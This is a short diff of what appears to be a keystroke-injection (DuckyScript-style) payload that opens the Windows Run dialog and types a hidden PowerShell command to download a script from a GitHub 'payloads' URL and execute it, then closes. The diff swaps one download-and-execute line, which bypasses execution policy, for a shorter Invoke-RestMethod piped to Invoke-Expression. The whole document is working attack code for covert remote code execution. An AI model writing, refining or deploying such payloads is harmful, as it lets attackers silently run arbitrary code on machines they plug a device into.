@@ -2,7 +2,7 @@ DEFINE #SCRIPTURL https://raw.githubusercontent.com/castrosp/payloads/refs/heads
 
 GUI r
 DELAY 1000
-STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr #SCRIPTURL?dl=1; invoke-expression $pl
+STRING powershell -w h Invoke-RestMethod -Uri #SCRIPTURL | Invoke-Expression
 ENTER
 DELAY 5000
 STRING exit
